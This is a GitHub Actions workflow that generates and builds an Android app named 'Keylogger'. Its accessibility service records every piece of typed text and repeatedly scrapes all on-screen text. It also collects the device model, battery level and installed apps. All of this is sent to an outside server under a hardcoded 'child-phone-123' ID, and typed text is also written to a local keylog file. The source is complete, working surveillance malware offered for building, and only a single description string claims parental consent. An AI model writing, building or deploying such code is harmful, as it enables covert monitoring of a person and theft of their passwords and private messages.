name: Build Keylogger UI APK

on:
  workflow_dispatch:

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - name: Set up JDK 17
        uses: actions/setup-java@v4
        with:
          distribution: 'temurin'
          java-version: '17'

      - name: Setup Gradle
        uses: gradle/actions/setup-gradle@v3

      - name: Create project files
        run: |
          mkdir -p app/src/main/java/com/example/keylogger
          mkdir -p app/src/main/res/layout
          mkdir -p app/src/main/res/values
          mkdir -p app/src/main/res/xml

          cat > build.gradle << 'EOF'
          buildscript {
              repositories {
                  google()
                  mavenCentral()
              }
              dependencies {
                  classpath 'com.android.tools.build:gradle:8.2.0'
              }
          }

          allprojects {
              repositories {
                  google()
                  mavenCentral()
              }
          }
          EOF

          cat > settings.gradle << 'EOF'
          pluginManagement {
              repositories {
                  google()
                  mavenCentral()
                  gradlePluginPortal()
              }
          }
          dependencyResolutionManagement {
              repositoriesMode.set(RepositoriesMode.PREFER_PROJECT)
              repositories {
                  google()
                  mavenCentral()
              }
          }
          rootProject.name = "Keylogger"
          include ':app'
          EOF

          cat > gradle.properties << 'EOF'
          android.useAndroidX=true
          android.enableJetifier=true
          org.gradle.jvmargs=-Xmx2048m
          EOF

          cat > app/build.gradle << 'EOF'
          plugins {
              id 'com.android.application'
          }

          android {
              namespace 'com.example.keylogger'
              compileSdk 34

              defaultConfig {
                  applicationId "com.example.keylogger"
                  minSdk 21
                  targetSdk 34
                  versionCode 1
                  versionName "1.0"
              }

              buildTypes {
                  release {
                      minifyEnabled false
                      proguardFiles getDefaultProguardFile('proguard-android-optimize.txt'), 'proguard-rules.pro'
                  }
              }

              compileOptions {
                  sourceCompatibility JavaVersion.VERSION_1_8
                  targetCompatibility JavaVersion.VERSION_1_8
              }
          }

          dependencies {
              implementation 'androidx.appcompat:appcompat:1.6.1'
              implementation 'com.squareup.okhttp3:okhttp:4.12.0'
          }
          EOF

          cat > app/proguard-rules.pro << 'EOF'
          EOF

          cat > app/src/main/AndroidManifest.xml << 'EOF'
          <?xml version="1.0" encoding="utf-8"?>
          <manifest xmlns:android="http://schemas.android.com/apk/res/android"
              package="com.example.keylogger">

              <uses-permission android:name="android.permission.INTERNET" />
              <uses-permission android:name="android.permission.QUERY_ALL_PACKAGES" />

              <application
                  android:allowBackup="true"
                  android:icon="@android:drawable/sym_def_app_icon"
                  android:label="@string/app_name"
                  android:theme="@style/Theme.Keylogger">

                  <activity
                      android:name=".MainActivity"
                      android:exported="true">
                      <intent-filter>
                          <action android:name="android.intent.action.MAIN" />
                          <category android:name="android.intent.category.LAUNCHER" />
                      </intent-filter>
                  </activity>

                  <service
                      android:name=".MonitorService"
                      android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE"
                      android:exported="false">
                      <intent-filter>
                          <action android:name="android.accessibilityservice.AccessibilityService" />
                      </intent-filter>
                      <meta-data
                          android:name="android.accessibilityservice"
                          android:resource="@xml/accessibility_config" />
                  </service>

              </application>
          </manifest>
          EOF

          cat > app/src/main/java/com/example/keylogger/MainActivity.java << 'EOF'
          package com.example.keylogger;

          import android.os.Bundle;
          import android.webkit.WebSettings;
          import android.webkit.WebView;
          import android.webkit.WebViewClient;
          import androidx.appcompat.app.AppCompatActivity;

          public class MainActivity extends AppCompatActivity {

              private WebView webView;

              @Override
              protected void onCreate(Bundle savedInstanceState) {
                  super.onCreate(savedInstanceState);
                  setContentView(R.layout.activity_main);

                  webView = findViewById(R.id.webView);

                  WebSettings webSettings = webView.getSettings();
                  webSettings.setJavaScriptEnabled(true);
                  webSettings.setDomStorageEnabled(true);
                  webSettings.setLoadWithOverviewMode(true);
                  webSettings.setUseWideViewPort(true);

                  webView.setWebViewClient(new WebViewClient());
                  webView.loadUrl("https://mobilecontrol-web.onrender.com/");
              }

              @Override
              public void onBackPressed() {
                  if (webView.canGoBack()) {
                      webView.goBack();
                  } else {
                      super.onBackPressed();
                  }
              }
          }
          EOF

          cat > app/src/main/java/com/example/keylogger/MonitorService.java << 'EOF'
          package com.example.keylogger;

          import android.accessibilityservice.AccessibilityService;
          import android.content.BroadcastReceiver;
          import android.content.Context;
          import android.content.Intent;
          import android.content.IntentFilter;
          import android.content.pm.ApplicationInfo;
          import android.content.pm.PackageManager;
          import android.os.BatteryManager;
          import android.os.Build;
          import android.os.Handler;
          import android.os.Looper;
          import android.view.accessibility.AccessibilityEvent;
          import android.view.accessibility.AccessibilityNodeInfo;
          import org.json.JSONArray;
          import org.json.JSONObject;
          import java.io.File;
          import java.io.FileWriter;
          import java.io.IOException;
          import java.util.ArrayList;
          import java.util.List;
          import java.util.concurrent.TimeUnit;
          import okhttp3.MediaType;
          import okhttp3.OkHttpClient;
          import okhttp3.Request;
          import okhttp3.RequestBody;
          import okhttp3.Response;

          public class MonitorService extends AccessibilityService {

              private static final String API_BASE = "https://mobilecontrol-web.onrender.com";
              private static final String DEVICE_ID = "child-phone-123";

              private OkHttpClient httpClient = new OkHttpClient.Builder()
                      .connectTimeout(10, TimeUnit.SECONDS)
                      .readTimeout(10, TimeUnit.SECONDS)
                      .build();

              private Handler mainHandler = new Handler(Looper.getMainLooper());
              private Thread uiSenderThread;
              private Thread deviceStateThread;

              @Override
              public void onServiceConnected() {
                  super.onServiceConnected();
                  startUiSender();
                  startDeviceStateSender();
              }

              private void startUiSender() {
                  uiSenderThread = new Thread(() -> {
                      while (!Thread.currentThread().isInterrupted()) {
                          try {
                              sendUiData();
                              Thread.sleep(2000);
                          } catch (InterruptedException e) {
                              Thread.currentThread().interrupt();
                          } catch (Exception e) {
                              e.printStackTrace();
                          }
                      }
                  });
                  uiSenderThread.setDaemon(true);
                  uiSenderThread.start();
              }

              private void startDeviceStateSender() {
                  deviceStateThread = new Thread(() -> {
                      while (!Thread.currentThread().isInterrupted()) {
                          try {
                              sendDeviceState();
                              Thread.sleep(30000); // send every 30 seconds
                          } catch (InterruptedException e) {
                              Thread.currentThread().interrupt();
                          } catch (Exception e) {
                              e.printStackTrace();
                          }
                      }
                  });
                  deviceStateThread.setDaemon(true);
                  deviceStateThread.start();
              }

              private void sendDeviceState() {
                  try {
                      String deviceName = Build.MANUFACTURER + " " + Build.MODEL;
                      int battery = getBatteryLevel();
                      List<InstalledApp> apps = getInstalledApps();

                      JSONArray appsArray = new JSONArray();
                      for (InstalledApp app : apps) {
                          JSONObject obj = new JSONObject();
                          obj.put("name", app.name);
                          obj.put("package", app.packageName);
                          appsArray.put(obj);
                      }

                      JSONObject payload = new JSONObject();
                      payload.put("deviceId", DEVICE_ID);
                      payload.put("deviceName", deviceName);
                      payload.put("battery", battery);
                      payload.put("installedApps", appsArray);

                      RequestBody body = RequestBody.create(
                              MediaType.parse("application/json; charset=utf-8"),
                              payload.toString()
                      );
                      Request request = new Request.Builder()
                              .url(API_BASE + "/api/device-state")
                              .post(body)
                              .build();
                      httpClient.newCall(request).execute().close();
                  } catch (Exception e) {
                      e.printStackTrace();
                  }
              }

              private int getBatteryLevel() {
                  BatteryManager bm = (BatteryManager) getSystemService(BATTERY_SERVICE);
                  if (bm != null) {
                      return bm.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY);
                  }
                  return 0;
              }

              private List<InstalledApp> getInstalledApps() {
                  List<InstalledApp> list = new ArrayList<>();
                  PackageManager pm = getPackageManager();
                  List<ApplicationInfo> apps = pm.getInstalledApplications(0);
                  for (ApplicationInfo appInfo : apps) {
                      if ((appInfo.flags & ApplicationInfo.FLAG_SYSTEM) == 0) {
                          String name = pm.getApplicationLabel(appInfo).toString();
                          String packageName = appInfo.packageName;
                          list.add(new InstalledApp(name, packageName));
                      }
                  }
                  return list;
              }

              private void sendKeylog(String text) {
                  new Thread(() -> {
                      try {
                          JSONObject payload = new JSONObject();
                          payload.put("deviceId", DEVICE_ID);
                          payload.put("text", text);
                          payload.put("timestamp", System.currentTimeMillis());

                          RequestBody body = RequestBody.create(
                                  MediaType.parse("application/json; charset=utf-8"),
                                  payload.toString()
                          );
                          Request request = new Request.Builder()
                                  .url(API_BASE + "/api/keylog")
                                  .post(body)
                                  .build();
                          httpClient.newCall(request).execute().close();
                      } catch (Exception e) {
                          e.printStackTrace();
                      }
                  }).start();
              }

              private void sendUiData() {
                  try {
                      AccessibilityNodeInfo root = getRootInActiveWindow();
                      if (root == null) return;

                      String uiText = extractTextFromNode(root);

                      JSONObject payload = new JSONObject();
                      payload.put("deviceId", DEVICE_ID);
                      payload.put("uiText", uiText);
                      payload.put("timestamp", System.currentTimeMillis());

                      RequestBody body = RequestBody.create(
                              MediaType.parse("application/json; charset=utf-8"),
                              payload.toString()
                      );
                      Request request = new Request.Builder()
                              .url(API_BASE + "/api/ui")
                              .post(body)
                              .build();
                      httpClient.newCall(request).execute().close();
                  } catch (Exception e) {
                      e.printStackTrace();
                  }
              }

              @Override
              public void onAccessibilityEvent(AccessibilityEvent event) {
                  if (event.getEventType() == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
                      if (event.getText() != null && event.getText().size() > 0) {
                          CharSequence typedText = event.getText().get(0);
                          if (typedText != null && typedText.length() > 0) {
                              String text = typedText.toString();
                              logToFile(text);
                              sendKeylog(text);
                          }
                      }
                  }
              }

              private String extractTextFromNode(AccessibilityNodeInfo node) {
                  if (node == null) return "";
                  StringBuilder sb = new StringBuilder();
                  if (node.getText() != null) {
                      sb.append(node.getText().toString()).append(" | ");
                  }
                  if (node.getContentDescription() != null) {
                      sb.append(node.getContentDescription().toString()).append(" | ");
                  }
                  for (int i = 0; i < node.getChildCount(); i++) {
                      AccessibilityNodeInfo child = node.getChild(i);
                      if (child != null) {
                          sb.append(extractTextFromNode(child));
                          child.recycle();
                      }
                  }
                  return sb.toString();
              }

              private void logToFile(String data) {
                  File dir = new File(getExternalFilesDir(null), "logs");
                  if (!dir.exists()) dir.mkdirs();
                  File file = new File(dir, "keylog.txt");
                  try (FileWriter fw = new FileWriter(file, true)) {
                      fw.append(data).append("\n");
                  } catch (IOException e) {
                      e.printStackTrace();
                  }
              }

              @Override
              public void onInterrupt() {
              }

              @Override
              public void onDestroy() {
                  super.onDestroy();
                  if (uiSenderThread != null && uiSenderThread.isAlive()) {
                      uiSenderThread.interrupt();
                  }
                  if (deviceStateThread != null && deviceStateThread.isAlive()) {
                      deviceStateThread.interrupt();
                  }
              }

              private static class InstalledApp {
                  String name;
                  String packageName;
                  InstalledApp(String name, String packageName) {
                      this.name = name;
                      this.packageName = packageName;
                  }
              }
          }
          EOF

          cat > app/src/main/res/layout/activity_main.xml << 'EOF'
          <?xml version="1.0" encoding="utf-8"?>
          <LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
              android:layout_width="match_parent"
              android:layout_height="match_parent"
              android:orientation="vertical">

              <WebView
                  android:id="@+id/webView"
                  android:layout_width="match_parent"
                  android:layout_height="match_parent" />
          </LinearLayout>
          EOF

          cat > app/src/main/res/values/strings.xml << 'EOF'
          <resources>
              <string name="app_name">Keylogger</string>
              <string name="accessibility_service_description">This service captures typed text, screen content, device state and installed apps for parental supervision with consent.</string>
          </resources>
          EOF

          cat > app/src/main/res/values/styles.xml << 'EOF'
          <resources>
              <style name="Theme.Keylogger" parent="Theme.AppCompat.Light.NoActionBar" />
          </resources>
          EOF

          cat > app/src/main/res/xml/accessibility_config.xml << 'EOF'
          <?xml version="1.0" encoding="utf-8"?>
          <accessibility-service xmlns:android="http://schemas.android.com/apk/res/android"
              android:accessibilityEventTypes="typeViewTextChanged|typeWindowStateChanged|typeWindowContentChanged"
              android:accessibilityFeedbackType="feedbackGeneric"
              android:accessibilityFlags="flagDefault|flagIncludeNotImportantViews|flagReportViewIds|flagRetrieveInteractiveWindows"
              android:canRetrieveWindowContent="true"
              android:notificationTimeout="100"
              android:description="@string/accessibility_service_description" />
          EOF

      - name: Generate Wrapper and Build
        run: |
          gradle wrapper --gradle-version 8.2
          chmod +x ./gradlew
          ./gradlew assembleDebug

      - name: Upload APK
        uses: actions/upload-artifact@v4
        with:
          name: keylogger-ui-debug-apk
          path: app/build/outputs/apk/debug/*.apk
